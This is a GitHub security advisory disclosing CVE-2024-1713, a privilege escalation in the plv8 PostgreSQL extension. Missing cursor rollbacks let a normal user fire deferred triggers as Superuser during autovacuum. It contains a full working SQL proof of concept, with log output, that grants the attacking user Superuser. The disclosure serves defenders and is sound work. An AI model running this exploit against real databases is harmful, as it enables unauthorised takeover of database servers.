
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-r7m9-grw7-vcc4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-r7m9-grw7-vcc4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=google%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[google](/google)
/
**[security-research](/google/security-research)**
Public

* [Notifications](/login?return_to=%2Fgoogle%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  421](/login?return_to=%2Fgoogle%2Fsecurity-research)
* [Star
   3.5k](/login?return_to=%2Fgoogle%2Fsecurity-research)

* [Code](/google/security-research)
* [Issues
  8](/google/security-research/issues)
* [Pull requests
  13](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

Additional navigation options

* [Code](/google/security-research)
* [Issues](/google/security-research/issues)
* [Pull requests](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

# PostgreSQL: Plv8 Deferred Trigger Privilege Escalation

High

[rcorrea35](/rcorrea35)
published
GHSA-r7m9-grw7-vcc4
Feb 21, 2024

## Package

Plv8
(PostgreSQL)

## Affected versions

3.2.1

## Patched versions

None

## Description

### Summary

PLV8 allows users to create cursors for queries. If an error occurs in a cursor operation the postgres error is caught and rethrown as an exception that can be caught in javascript. The cursor implementations for plv8 are missing rollbacks. This enables cases where a rollback is expected but a malicious user is able to catch the error and commit instead. For example with deferred triggers. A malicious user who can create objects in a database with plv8 installed can cause deferred triggers to execute as the Superuser during autovacuum (similar to [CVE-2020-25695](https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc)).

This was tested against PostgreSQL 14.10 with plv8-3.2.1.

### Severity

High - A user who can create objects in a database with plv8 installed is able to cause deferred triggers to execute as the Superuser during autovacuum.

### Proof of Concept

This PoC assumes that there is a *Superuser* named *postgres* and a normal user named *test*. The *test* user should be able to create objects within a database where plv8 is installed.

As *Superuser*

```
CREATE EXTENSION plv8;
```

As user *test*

```
-- Setup index, table, and triggers similar to CVE-2020-25695
CREATE TABLE public.to_vacuum (a int, b int);
CREATE TABLE public.has_trigger (a int);

CREATE OR REPLACE FUNCTION public.index_func(integer)
RETURNS integer
AS $$
BEGIN
    RETURN 1;
END;
$$ LANGUAGE PLPGSQL IMMUTABLE;

CREATE INDEX i ON public.to_vacuum (public.index_func(a));

CREATE OR REPLACE FUNCTION public.plv8_cursor()
RETURNS int
AS $$
  try {
    var p = plv8.prepare("INSERT INTO public.has_trigger VALUES (1) RETURNING *", []);
    var c = p.cursor([]);
    // while (row = c.move(1)) {}
    while (row = c.fetch()) {}
  } catch(err) {
    plv8.elog(WARNING, 'plv8: ' + err);
}
    return 1;
$$ LANGUAGE plv8;

CREATE OR REPLACE PROCEDURE wrapper()
AS $$
BEGIN
  BEGIN
    PERFORM public.plv8_cursor();
  EXCEPTION WHEN OTHERS THEN
    COMMIT;
  END;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION public.index_func(integer)
RETURNS integer
AS $$
BEGIN
    CALL public.wrapper();
    RETURN 1;
END;
$$ LANGUAGE PLPGSQL;

CREATE OR REPLACE FUNCTION public.payload()
RETURNS trigger
AS $$
BEGIN
  IF USER = 'postgres' THEN
    ALTER USER test WITH Superuser;
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE PLPGSQL;

CREATE CONSTRAINT TRIGGER defer
AFTER INSERT ON public.has_trigger
INITIALLY DEFERRED
FOR EACH ROW
EXECUTE PROCEDURE public.payload();

ALTER TABLE public.to_vacuum SET (autovacuum_vacuum_threshold = 1);
ALTER TABLE public.to_vacuum SET (autovacuum_analyze_threshold = 1);

INSERT INTO public.to_vacuum VALUES (1,1);
INSERT INTO public.to_vacuum VALUES (2,2);
INSERT INTO public.to_vacuum VALUES (3,3);

```

Wait for autovacuum to run this could take several minutes with default settings. You’ll see log entries such as the following when.

```
[18303] WARNING:  plv8: Error: cannot fire deferred trigger within security
-restricted operation
[18303] CONTEXT:  SQL statement "SELECT public.plv8_cursor()"
        PL/pgSQL function public.wrapper() line 4 at PERFORM
        SQL statement "CALL public.wrapper()"
        PL/pgSQL function public.index_func(integer) line 3 at CALL
[18303] WARNING:  snapshot 0x55e5cbdb2680 still active
```

Now check the user's privileges

```
\du test
                List of roles
 Role name |      Attributes      | Member of
-----------+----------------------+-----------
 test      | Superuser, Create DB | {}
```
### Further Analysis

When a plv8 cursor encounters an error the postgres error is caught and rethrown as an error that can be caught in javascript.

[plv8\_CursorFetch](https://github.com/plv8/plv8/blob/37c2048bf8cae4751f5791ea9970c63db2b2fa79/plv8_func.cc#L974)

[plv8\_CursorMove](https://github.com/plv8/plv8/blob/37c2048bf8cae4751f5791ea9970c63db2b2fa79/plv8_func.cc#L1039)

Without rolling back or aborting the transaction can leave Postgres in a bad state. In the PoC we use deferred triggers in autovacuum to gain privilege escalation as there’s prior art for this technique ([CVE-2020-25695](https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc)). When postgres encounters a deferred trigger it gets added to an event list, after being added it [then checks](https://github.com/postgres/postgres/blob/727cf6f6d31cf5a8cbe144207f22d0b76583f4d0/src/backend/commands/trigger.c#L4231) if it’s in a *InSecurityRestrictedOperation* in which case it throws an error. From cursor behavior we are then able to catch the error and commit the transaction causing the triggers to execute.

### Timeline

**Date reported**: 01/09/2024

**Date fixed**: 01/21/2024

**Date disclosed**: 02/21/2024

### Severity

High

### CVE ID

CVE-2024-1713

### Weaknesses

No CWEs

### Credits

* [![@pedroga-g](https://avatars.githubusercontent.com/u/74927869?s=40&v=4)](/pedroga-g)
  [pedroga-g](/pedroga-g)
  Finder

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

